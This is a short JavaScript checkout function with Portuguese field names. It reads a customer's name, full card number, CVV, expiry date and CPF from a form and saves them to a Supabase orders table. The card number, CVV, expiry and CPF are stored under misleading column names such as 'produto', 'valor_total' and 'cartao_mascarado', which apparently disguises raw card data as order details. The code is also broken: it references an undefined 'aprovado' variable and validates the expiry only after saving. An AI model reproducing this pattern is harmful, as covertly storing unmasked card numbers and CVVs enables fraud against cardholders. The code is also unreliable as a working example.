async function pagar() {
  const nome = document.getElementById("nome").value;
  const cartao = document.getElementById("cartao").value;
  const cvv = document.getElementById("cvv").value;
  const validade = document.getElementById("validade").value;
  const cpf = document.getElementById("cpf").value;
 

  if (!nome || !cartao) {
    alert("Preencha todos os campos");
    return;
  }

  const pedido = {
    nome: nome,
    produto: cartao,
    valor_total: cvv,
    parcelas: validade,
    cartao_mascarado: cpf,
    status: aprovado
  };

  const { error } = await supabase
    .from("pedidos")
    .insert([pedido]);

  if (error) {
    console.error(error);
    alert("Erro ao salvar (veja o console)");
  } else {
    alert("Pedido salvo com sucesso!");
  }
if (!validarValidade(validade)) {
    alert("Validade inválida. Use MM/AA");
    return;
  }

}

